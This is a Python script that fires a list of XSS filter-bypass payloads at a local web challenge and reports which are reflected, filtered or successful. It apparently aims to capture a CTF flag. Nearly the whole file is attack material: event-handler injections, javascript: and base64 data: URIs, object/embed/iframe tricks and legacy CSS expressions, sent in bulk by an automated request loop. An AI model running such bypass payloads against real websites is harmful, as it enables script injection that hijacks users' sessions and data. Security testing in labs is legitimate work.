import requests
import urllib.parse
import re

base_url = "http://127.0.0.1:33203/page"

# Testing sophisticated bypass techniques that might actually execute
sophisticated_payloads = [
    # Using different event handlers that might not be filtered
    ("onfocus", '<input onfocus=alert("XSS") autofocus>', "onfocus"),
    ("onblur", '<input onblur=alert("XSS") autofocus>', "onblur"),
    ("oninput", '<input oninput=alert("XSS")>', "oninput"),
    ("onchange", '<input onchange=alert("XSS")>', "onchange"),
    ("onsearch", '<input type=search onsearch=alert("XSS")>', "onsearch"),
    
    # Using details/summary tags
    ("on toggle", '<details open ontoggle=alert("XSS")>', "ontoggle"),
    
    # Using marque (old tag but might work)
    ("marquee", '<marquee onstart=alert("XSS")>XSS</marquee>', "marquee"),
    
    # Using video/audio tags
    ("video", '<video><source onerror=alert("XSS")>', "video"),
    ("audio", '<audio><source onerror=alert("XSS")>', "audio"),
    
    # Using object/embed tags
    ("object", '<object data="javascript:alert(",XSS,")">', "object_js"),
    ("object data", '<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=>', "object_data"),
    ("embed", '<embed src="javascript:alert(",XSS,")">', "embed_js"),
    
    # Using mathML (SVG alternative)
    ("math", '<math><mi xlink:href="javascript:alert(",XSS,")">X', "math"),
    
    # Using form with action javascript
    ("form action", '<form action="javascript:alert(",XSS,")"><input type=submit>', "form_action"),
    
    # Using body with background
    ("body background", '<body background="javascript:alert(",XSS,")">', "body_bg"),
    
    # Using table with background
    ("table background", '<table background="javascript:alert(",XSS,")">', "table_bg"),
    
    # Using base64 encoded javascript
    ("script src data", '<script src="data:text/javascript,alert(",XSS,")">', "script_data"),
    
    # Using XML namespace
    ("xml namespace", '<xml><script><![CDATA[alert("XSS")]]></script></xml>', "xml"),
    
    # Using CSS expression
    ("css expression", '<div style="xss:expression(alert("XSS"))">', "css_expr_old"),
    
    # Using IE specific behavior
    ("behavior", '<div style="behavior:url(test.htc)" onload=alert("XSS")>', "behavior"),
    
    # Using XBL in Firefox
    ("xbl", '<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#"><script>alert("XSS")</script></a>', "xbl"),
    
    # Using dataURL in anchor
    ("anchor data", '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=">click</a>', "anchor_data"),
    
    # Using VBScript in IE
    ("vbscript", '<script language=vbscript>msgbox("XSS")</script>', "vbscript_tag"),
    
    # Using PHP protocol wrapper
    ("php wrapper", '<iframe src="php://filter/convert.base64-encode/resource=data:text/plain,alert(",XSS,")"></iframe>', "php_wrapper"),
]

print("[*] Testing Sophisticated XSS Bypass Techniques")

all_results = []

for test_name, payload, test_id in sophisticated_payloads:
    print(f"\n[+] Testing: {test_name}")
    print(f"    [PAYLOAD] {payload[:60]}")
    
    try:
        params = {'name': payload}
        response = requests.get(base_url, params=params, timeout=10)
        
        payload_reflected = payload in response.text
        response_length = len(response.content)
        
        # Check for various indicators
        indicators = []
        if 'alert' in response.text.lower():
            indicators.append('alert')
        if 'XSS' in response.text:
            indicators.append('XSS')
        if 'msgbox' in response.text.lower():
            indicators.append('msgbox')
        if 'javascript' in response.text.lower():
            indicators.append('javascript')
        
        # Check for FLAG patterns
        flag_patterns = re.findall(r'FLAG\{[^}]+\}', response.text)
        
        print(f"    [STATUS]  {response.status_code}")
        print(f"    [LENGTH]  {response_length} bytes")
        print(f"    [REFLECT] Payload reflected: {payload_reflected}")
        
        if indicators:
            print(f"    [FOUND]   Indicators: {', '.join(indicators)}")
        
        if flag_patterns:
            print(f"    [!!]      FLAG FOUND: {flag_patterns}")
        
        # Analyze response more deeply
        if 'error_star.png' in response.text:
            print(f"    [STAR]    Error star - Payload processed but failed")
            result_status = "ERROR_STAR"
            # Show the error message
            error_msg = "Failed! Try again!"
            if error_msg in response.text:
                print(f"    [MSG]     {error_msg}")
        elif 'new_star.png' in response.text:
            print(f"    [STAR]    New star - Filtered")
            result_status = "FILTERED"
        elif 'Success!' in response.text or 'Congratulations!' in response.text:
            print(f"    [!!]      SUCCESS MESSAGE DETECTED!")
            result_status = "SUCCESS"
        else:
            result_status = "UNKNOWN"
        
        # Store detailed results
        all_results.append({
            'test_name': test_name,
            'payload': payload,
            'status': response.status_code,
            'length': response_length,
            'reflected': payload_reflected,
            'indicators': indicators,
            'flags': flag_patterns,
            'result_status': result_status
        })
        
    except Exception as e:
        print(f"    [ERROR]   {str(e)}")
        all_results.append({
            'test_name': test_name,
            'error': str(e)
        })

# Summary analysis
print("\n" + "="*80)
print("[*] SUMMARY ANALYSIS")
print("="*80)

successful_payloads = []
filtered_payloads = []
error_payloads = []

for result in all_results:
    if 'error' in result:
        print(f"[ERROR] {result['test_name']}: {result['error']}")
    else:
        status = result['result_status']
        print(f"[{status:12}] {result['test_name']:30} | Indicators: {len(result['indicators'])}")
        
        if result['result_status'] == 'SUCCESS':
            successful_payloads.append(result)
        elif result['result_status'] == 'ERROR_STAR':
            error_payloads.append(result)
        elif result['result_status'] == 'FILTERED':
            filtered_payloads.append(result)

print(f"\n[*] Totals:")
print(f"    Successful: {len(successful_payloads)}")
print(f"    Error star: {len(error_payloads)}")
print(f"    Filtered:   {len(filtered_payloads)}")

# Detailed review of error payloads (they bypassed filter but didn't execute)
if error_payloads:
    print(f"\n[*] Detailed Error Star Payloads (bypassed filter):")
    print("-" * 80)
    for result in error_payloads:
        print(f"\n[+] {result['test_name']}:")
        print(f"    Payload: {result['payload']}")
        print(f"    Indicators: {result['indicators']}")

print("\n[*] Testing complete")
